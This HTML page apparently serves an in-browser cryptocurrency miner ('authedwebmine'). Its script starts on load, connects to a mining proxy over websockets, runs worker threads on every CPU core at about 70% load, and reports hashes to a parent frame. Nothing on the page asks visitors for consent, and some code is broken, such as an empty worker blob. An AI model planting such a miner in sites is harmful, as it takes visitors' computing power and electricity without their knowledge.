
<!doctype html>
<html><head></head><body><script>"use strict";
var WS=null;var WORKER_BLOB='';﻿function get_ws_uri(page) {
    var ws_uri;
    var loc = window.location;
    if (loc.protocol === "https:") {
        ws_uri = "wss:";
    } else {
        ws_uri = "ws:";
    }
    ws_uri += "//" + loc.host;
    ws_uri += "/" + page;
    return ws_uri;
}

(function (global, factory) {
    if (typeof define === 'function' && define.amd) {
        define([], factory);
    } else if (typeof module !== 'undefined' && module.exports) {
        module.exports = factory();
    } else {
        global.ReconnectingWebSocket = factory();
    }
})(this, function () {

    if (!('WebSocket' in window)) {
        return;
    }

    function ReconnectingWebSocket(urls, protocols, options) {

        // Default settings
        var settings = {
            debug: false,
            automaticOpen: true,
            reconnectInterval: 1000,
            maxReconnectInterval: 30000,
            reconnectDecay: 1.5,
            timeoutInterval: 2000,
            maxReconnectAttempts: null,
            binaryType: 'blob'
        }
        if (!options) { options = {}; }

        for (var key in settings) {
            if (typeof options[key] !== 'undefined') {
                this[key] = options[key];
            } else {
                this[key] = settings[key];
            }
        }

        this.urls = urls;
        this.sampledUrls = []
        this.reconnectAttempts = 0;
        this.readyState = WebSocket.CONNECTING;
        this.protocol = null;

        var self = this;
        var ws;
        var forcedClose = false;
        var timedOut = false;
        var eventTarget = document.createElement('div');
        eventTarget.addEventListener('open', function (event) { self.onopen(event); });
        eventTarget.addEventListener('close', function (event) { self.onclose(event); });
        eventTarget.addEventListener('connecting', function (event) { self.onconnecting(event); });
        eventTarget.addEventListener('message', function (event) { self.onmessage(event); });
        eventTarget.addEventListener('error', function (event) { self.onerror(event); });

        this.addEventListener = eventTarget.addEventListener.bind(eventTarget);
        this.removeEventListener = eventTarget.removeEventListener.bind(eventTarget);
        this.dispatchEvent = eventTarget.dispatchEvent.bind(eventTarget);

        function generateEvent(s, args) {
            var evt = document.createEvent("CustomEvent");
            evt.initCustomEvent(s, false, false, args);
            return evt;
        };

        function shuffle(array) {
            var currentIndex = array.length, temporaryValue, randomIndex;

            // While there remain elements to shuffle...
            while (0 !== currentIndex) {

                // Pick a remaining element...
                randomIndex = Math.floor(Math.random() * currentIndex);
                currentIndex -= 1;

                // And swap it with the current element.
                temporaryValue = array[currentIndex];
                array[currentIndex] = array[randomIndex];
                array[randomIndex] = temporaryValue;
            }

            return array;
        }

        this.sampleUrl = function () {
            if (this.sampledUrls.length === 0) {
                this.sampledUrls = shuffle(this.urls.slice(0));
                if (this.reconnectAttempts > 1)
                    this.timeoutInterval = 2000;

                this.reconnectAttempts++;
            }

            return this.sampledUrls.pop();
        }

        this.open = function (reconnectAttempt) {
            var url = this.sampleUrl();             
            ws = new WebSocket(url, protocols || []);
            ws.binaryType = this.binaryType;

            if (reconnectAttempt) {
                if (this.maxReconnectAttempts && this.reconnectAttempts > this.maxReconnectAttempts) {
                    return;
                }
            } else {
                eventTarget.dispatchEvent(generateEvent('connecting'));
                this.reconnectAttempts = 0;
            }
            
            var localWs = ws;
            var timeout = setTimeout(function () {               
                timedOut = true;
                localWs.close();
                timedOut = false;
            }, self.timeoutInterval);

            ws.onopen = function (event) {
                clearTimeout(timeout);
                
                self.protocol = ws.protocol;
                self.readyState = WebSocket.OPEN;
                self.reconnectAttempts = 0;
                var e = generateEvent('open');
                e.isReconnect = reconnectAttempt;
                reconnectAttempt = false;
                eventTarget.dispatchEvent(e);
            };

            ws.onclose = function (event) {
                clearTimeout(timeout);
                ws = null;
                if (forcedClose) {
                    self.readyState = WebSocket.CLOSED;
                    eventTarget.dispatchEvent(generateEvent('close'));
                } else {
                    self.readyState = WebSocket.CONNECTING;
                    var e = generateEvent('connecting');
                    e.code = event.code;
                    e.reason = event.reason;
                    e.wasClean = event.wasClean;
                    eventTarget.dispatchEvent(e);
                    if (!reconnectAttempt && !timedOut) {
                        eventTarget.dispatchEvent(generateEvent('close'));
                    }

                    var timeout = self.reconnectInterval * Math.pow(self.reconnectDecay, self.reconnectAttempts);
                    if (self.reconnectAttempts < 2)
                        timeout = 1;

                    setTimeout(function () {                        
                        self.open(true);
                    }, timeout > self.maxReconnectInterval ? self.maxReconnectInterval : timeout);
                }
            };
            ws.onmessage = function (event) {
                var e = generateEvent('message');
                e.data = event.data;
                eventTarget.dispatchEvent(e);
            };
            ws.onerror = function (event) {                
                eventTarget.dispatchEvent(generateEvent('error'));
            };
        }
        
        if (this.automaticOpen == true) {
            this.open(false);
        }
        this.send = function (data) {
            if (ws) {
                return ws.send(data);
            } else {
                throw 'INVALID_STATE_ERR : Pausing to reconnect websocket';
            }
        };
        this.close = function (code, reason) {
            // Default CLOSE_NORMAL code
            if (typeof code == 'undefined') {
                code = 1000;
            }
            forcedClose = true;
            if (ws) {
                ws.close(code, reason);
            }
        };

        this.refresh = function () {
            if (ws) {
                ws.close();
            }
        };
    }

    
    ReconnectingWebSocket.prototype.onopen = function (event) { };
    ReconnectingWebSocket.prototype.onclose = function (event) { };
    ReconnectingWebSocket.prototype.onconnecting = function (event) { };
    ReconnectingWebSocket.prototype.onmessage = function (event) { };
    ReconnectingWebSocket.prototype.onerror = function (event) { };
    ReconnectingWebSocket.debugAll = false;

    ReconnectingWebSocket.CONNECTING = WebSocket.CONNECTING;
    ReconnectingWebSocket.OPEN = WebSocket.OPEN;
    ReconnectingWebSocket.CLOSING = WebSocket.CLOSING;
    ReconnectingWebSocket.CLOSED = WebSocket.CLOSED;

    return ReconnectingWebSocket;
});﻿"use strict";

var CURRENT_BLOB = null;
var CURRENT_JOB_ID = null;
var CURRENT_TARGET = null;
var CURRENT_WORKERS = [];
var MINING_IS_STOPPED = true;
var REQUIRE_MINING_STOP = false;
var CURRENT_THROTTLE = 0.0;
var CURRENT_TAB_IDENTIFICATION = "id" + Math.random();
var SCRIPT_VERSION = "3.16";
var WATCHDOG_FLAG = false;
var WATCHDOG_ALARMED = false;
var WATCHDOG_RUNNING = false;
var API_KEY = null;
var HASHRATE_MEASUREMENT_DURATION = 10;
var HASHRATE = 0;
var HASHES_ACC = 0;

WS = null;

function isMobile() {
    return /mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)
}

function log(message) {
    if (typeof USE_LOG === 'undefined' || !USE_LOG)
        return;

    console.log(message);
}

function set_cpu_load(cpu_load) {
    var newThrottle = 1.0 - (cpu_load / 100.0);

    if (newThrottle != CURRENT_THROTTLE) {
        postParentMessage({ 'cpu_load': cpu_load });
    }

    CURRENT_THROTTLE = newThrottle;
}

function handle_command(command) {
    var command_name = command["command"];
    var parameters = command["parameters"];

    switch (command_name) {
        case "reload":
            reload_miner(parameters["time_range"]);
            break;

        case "set_job":
            CURRENT_BLOB = parameters["blob"];
            CURRENT_JOB_ID = parameters["job_id"];
            CURRENT_TARGET = parameters["target"];
            break;

        case "get_info":
            send_info();
            break;

        case "set_cpu_load":
            var cpu_load = parameters["cpu_load"];
            set_cpu_load(cpu_load);
            break;

        default:
            log("unknown command: " + command_name);
            return;
    }
}

function has_wasm_support() {
    return window.WebAssembly !== undefined;
}

function api_handler(event) {
    if (!event.data.webmine)
        return;

    var data = event.data.webmine;
    if (data.cpu_load) {
        set_cpu_load(data.cpu_load);
    }
}

function difficulty_to_shares(d) {
    var difficulty = d[6] + d[7] + d[4] + d[5] + d[2] + d[3] + d[0] + d[1];
    var difficulty_dec = parseInt(difficulty, 16);
    return Math.round(4294967295.0 / difficulty_dec);
}

function connect() {
    if (window.location.hostname === "authedwebmine.cz") {
        var proxies = ["wss://authedwebmine.cz/miner_proxy"];
    } else {
        if (typeof PROXY_PAGE === 'undefined')
            PROXY_PAGE = "miner_proxy"

        var proxy = window.location.hostname + "/" + PROXY_PAGE;
        if (window.location.protocol == "https:")
            proxy = "wss://" + proxy;
        else
            proxy = "ws://" + proxy;

        var proxies = [proxy];
    }
    WS = new ReconnectingWebSocket(proxies);

    WS.onopen = function (event) {
        send_info();
        start_mining();
    };

    WS.onclose = function (event) {
        stop_mining();
    };

    WS.onmessage = function (event) {
        var msg = event.data;
        if (msg === "null") {
            // repeat request
            setTimeout(send_job_request, 1000);
        } else if (msg[0] === "{") {
            handle_command(JSON.parse(msg));
        } else {
            // back compatilibity
            // job data arrived
            var parsed = JSON.parse(msg);

            CURRENT_BLOB = parsed[0];
            CURRENT_JOB_ID = parsed[1];
            CURRENT_TARGET = parsed[2];
        }
    };

    if (!WATCHDOG_RUNNING) {
        setInterval(watch_dog, 30000);
        WATCHDOG_RUNNING = true;
    }

    if (window.addEventListener) {
        window.addEventListener('message', api_handler, false);
    } else {
        window.attachEvent("onmessage", api_handler);
    }
}

function send_command(command_name, command_parameters) {
    command_parameters = command_parameters || {};

    var command = {
        command: command_name,
        parameters: command_parameters
    };

    var json_command = JSON.stringify(command);
    WS.send(json_command);
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function stripUrlParams(url, parameter) {
    var urlparts = url.split('?');
    if (urlparts.length >= 2) {
        var stuff = urlparts[1];
        if (typeof (stuf) === undefined)
            stuff = "";

        var pars = stuff.split("&");
        var comps = {};
        for (var i = 0; i < pars.length; i++) {
            var spl = pars[i].split("=");
            comps[spl[0]] = spl[1];
        }
        pars = [];
        for (var a in comps)
            pars.push(a + "=" + comps[a]);
        url = urlparts[0] + '?' + pars.join('&');
        return url;
    } else {
        return url;
    }
}

function reload_miner(time_range) {
    time_range = time_range || 30000;
    var reload_time = getRandomInt(0, time_range);

    setTimeout(function () {
        var url = stripUrlParams(window.location + "&rnd=" + Math.random());
        window.location.replace(url);
    }, reload_time);
}

function send_info() {
    send_command("info", {
        version: SCRIPT_VERSION,
        wasm: has_wasm_support(),
        api: API_KEY
    });
}

function send_share(job_id, nonce, result) {
    send_command("submit", {
        job_id: job_id,
        nonce: nonce,
        result: result
    });
}

function send_job_request() {
    send_command("get_job");
}

function stop_mining() {
    if (MINING_IS_STOPPED)
        return;

    REQUIRE_MINING_STOP = true;
}

function start_mining() {
    REQUIRE_MINING_STOP = false;

    if (MINING_IS_STOPPED) {
        MINING_IS_STOPPED = false;
        send_job_request();
    }
}

function b64toBlob(b64Data, contentType, sliceSize) {
    contentType = contentType || '';
    sliceSize = sliceSize || 512;

    var byteCharacters = atob(b64Data);
    var byteArrays = [];

    for (var offset = 0; offset < byteCharacters.length; offset += sliceSize) {
        var slice = byteCharacters.slice(offset, offset + sliceSize);

        var byteNumbers = new Array(slice.length);
        for (var i = 0; i < slice.length; i++) {
            byteNumbers[i] = slice.charCodeAt(i);
        }

        var byteArray = new Uint8Array(byteNumbers);

        byteArrays.push(byteArray);
    }

    var blob = new Blob(byteArrays, { type: contentType });
    return blob;
}

function create_worker(id) {
    log("creating worker " + id);
    var w = null;

    if (typeof WORKER_BLOB === "undefined") {
        if (has_wasm_support())
            w = new Worker(WORKER_URI + "?v=" + SCRIPT_VERSION);
        else
            w = new Worker(WORKER_NOWASM_URI + "?v=" + SCRIPT_VERSION);
    } else {
        var blob = b64toBlob(WORKER_BLOB);
        var blobURL = (window.URL ? URL : webkitURL).createObjectURL(blob, {
            type: 'application/javascript; charset=utf-8'
        });
        w = new Worker(blobURL);
    }

    w.is_ready = false;
    w.onerror = handle_error;
    w.onmessage = function (e) {
        handle_worker_message(w, e);
    };

    CURRENT_WORKERS[id] = w;
    w.id = id;
}

function postParentMessage(message) {
    window.parent.postMessage({
        "webmine": message
    }, '*');
}

function handle_worker_message(w, e) {
    if (e.data !== undefined) {
        if (e.data === "ready") {
            //first message is 'ready''
            w.is_ready = true;
            fill_worker(w);
            return;
        }

        if (e.data["error"] !== undefined) {
            handle_error(e.data["error"]);
            return;
        }

        //worker finished a work        
        if (e.data["nonce"] !== undefined) {
            //share is available
            e.data["hashrate"] = HASHRATE;
            log(e.data);
            send_share(e.data["job_id"], e.data["nonce"], e.data["result"]);
            var shares = difficulty_to_shares(CURRENT_TARGET);
            postParentMessage({ 'shares': shares });
        }

        if (e.data["hashes"] !== undefined) {
            var hashes = e.data["hashes"];
            HASHES_ACC += hashes;
            postParentMessage({ 'hashes': hashes });
        }
    }

    WATCHDOG_FLAG = false;

    if (REQUIRE_MINING_STOP || MINING_IS_STOPPED) {
        MINING_IS_STOPPED = true;
        REQUIRE_MINING_STOP = false;
        CURRENT_BLOB = null;
        CURRENT_JOB_ID = null;
        CURRENT_TARGET = null;
    }

    // ask for more work
    fill_worker(w);
}

function fill_worker(worker) {
    if (worker === undefined)
        return;

    if (!CURRENT_BLOB) {
        setTimeout(function () { fill_worker(worker); }, 1000);
        return;
    }

    worker.postMessage({
        blob: CURRENT_BLOB,
        job_id: CURRENT_JOB_ID,
        target: CURRENT_TARGET,
        throttle: CURRENT_THROTTLE
    });
}

function _run_miner() {
    "use strict";

    connect();

    var percentage = 0.7; //set the default throtlle
    var thread_count = navigator.hardwareConcurrency || 4;
    CURRENT_THROTTLE = 1.0 - percentage;
    for (var i = 0; i < thread_count; ++i) {
        create_worker(i);
    }
}

function isOtherTabRunning() {
    var time_diff = -1;

    try {
        var tabJson = localStorage.getItem("webmine");
        if (tabJson) {
            var tab = JSON.parse(tabJson);
            time_diff = Date.now() - tab.time;
            if (tab.identification !== CURRENT_TAB_IDENTIFICATION && time_diff < 3000) {
                return true;
            }
        }
    } catch (e) {
        //nothing to do
    }

    return false;
}

function updateTabStatus() {
    if (isOtherTabRunning()) {
        log("hijacked by other tab");
        return;
    }

    localStorage.setItem("webmine", JSON.stringify({
        identification: CURRENT_TAB_IDENTIFICATION,
        time: Date.now()
    }));
}

function run_miner(api_key = null) {
    API_KEY = api_key;

    if (isOtherTabRunning()) {
        log("other tab detected");
        setTimeout(function () { run_miner(api_key); }, 2000);
        return;
    }

    updateTabStatus();
    setInterval(updateTabStatus, 1000);
    return _run_miner();
}

function watch_dog() {
    if (MINING_IS_STOPPED)
        // dont make false alarms
        return;


    if (WATCHDOG_ALARMED && !WATCHDOG_FLAG) {
        WATCHDOG_ALARMED = false;
        if (SCRIPT_VERSION.indexOf("_on") < 0)
            SCRIPT_VERSION = SCRIPT_VERSION + "_on";
        send_info();
    }

    if (WATCHDOG_FLAG && !WATCHDOG_ALARMED) {
        if (SCRIPT_VERSION.indexOf("_off") < 0)
            SCRIPT_VERSION = SCRIPT_VERSION + "_off";

        WATCHDOG_ALARMED = true;
        send_info();

        if (!CURRENT_BLOB)
            send_command("error", { message: "WATCHDOG: job is not specified." });
        return;
    }

    WATCHDOG_FLAG = true;
}

function handle_error(msg, url, lineNo, columnNo, error) {
    return;
    error = error || {};
    if (typeof msg !== "string") {
        msg = JSON.stringify(msg, ["message", "arguments", "type", "name"]);
        if (msg === '{"type":"error"}')
            return;
    }

    send_command("error", {
        message: msg,
        line: lineNo,
        column: columnNo,
        stack: error.stack || 'nostack',
        url: url
    });
}
window.onerror = handle_error;

window.parent.postMessage('authedwebmine-granted', '*')

function update_hashrate() {
    HASHRATE = HASHES_ACC / HASHRATE_MEASUREMENT_DURATION;
    HASHES_ACC = 0;
}

setInterval(update_hashrate, HASHRATE_MEASUREMENT_DURATION * 1000);

var PROXY_PAGE='miner_proxy';run_miner("8KFIORk0GLyVsKG")</script></body></html>
